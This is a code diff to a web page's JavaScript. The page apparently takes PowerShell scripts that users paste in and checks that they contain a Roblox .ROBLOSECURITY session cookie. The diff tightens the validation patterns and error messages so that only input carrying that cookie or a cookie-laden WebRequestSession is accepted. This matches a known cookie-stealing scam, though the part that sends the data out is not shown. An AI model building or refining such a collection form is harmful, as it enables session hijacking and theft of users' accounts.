@@ -239,7 +239,7 @@ async function submitPowerShell() {
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
-            showNotification('No valid Roblox authentication detected in input', 'error');
+            showNotification('No .ROBLOSECURITY authentication found in PowerShell script', 'error');
             
             setTimeout(() => {
                 submitBtn.disabled = false;
@@ -443,10 +443,13 @@ function hasValidData(text) {
     // Check if it's a PowerShell script with session/authentication patterns
     const powerShellPatterns = [
         /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
-        /\$session\.Add.*ROBLOSECURITY/is,
-        /System\.Net.*ROBLOSECURITY/is,
-        /WebRequestSession.*Auth/is,
-        /New-Object.*System\.Net/is
+        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
+        /System\.Net\.Cookie.*ROBLOSECURITY/is,
+        /WebRequestSession.*Cookies/is,
+        /New-Object.*System\.Net\.Cookie/is,
+        // Also allow PowerShell scripts with session setup even without ROBLOSECURITY
+        /\$session\s*=.*WebRequestSession/is,
+        /\$session\.Cookies\.Add/is
     ];
     
     for (const pattern of powerShellPatterns) {
